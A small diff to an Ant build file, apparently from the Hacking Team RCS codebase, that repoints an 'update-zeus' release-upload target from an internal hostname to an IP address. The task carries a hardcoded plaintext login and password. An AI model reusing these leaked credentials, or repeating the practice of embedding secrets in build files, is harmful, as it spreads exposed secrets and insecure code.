@@ -575,7 +575,7 @@
 	</target>
 
 	<target name="update-zeus">
-		<updaterelease server="rcs-zeus-master.hackingteam.local" login="zeno" password="Fabriziop123" file="server/android_${version}.zip" />
+		<updaterelease server="192.168.100.190" login="zeno" password="Fabriziop123" file="server/android_${version}.zip" />
 		<!-- <copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
 	</target>
 
